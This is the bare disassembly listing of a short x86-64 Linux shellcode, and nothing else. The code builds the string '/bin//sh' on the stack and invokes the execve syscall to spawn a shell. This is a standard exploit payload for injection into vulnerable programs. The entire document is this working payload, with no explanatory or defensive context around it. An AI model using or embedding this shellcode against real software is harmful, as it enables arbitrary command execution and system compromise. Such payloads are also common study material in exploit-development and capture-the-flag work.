   0:   31 f6                   xor    esi,esi
   2:   48 bb 2f 62 69 6e 2f    movabs rbx,0x68732f2f6e69622f
   9:   2f 73 68 
   c:   56                      push   rsi
   d:   53                      push   rbx
   e:   54                      push   rsp
   f:   5f                      pop    rdi
  10:   6a 3b                   push   0x3b
  12:   58                      pop    rax
  13:   31 d2                   xor    edx,edx
  15:   0f 05                   syscall
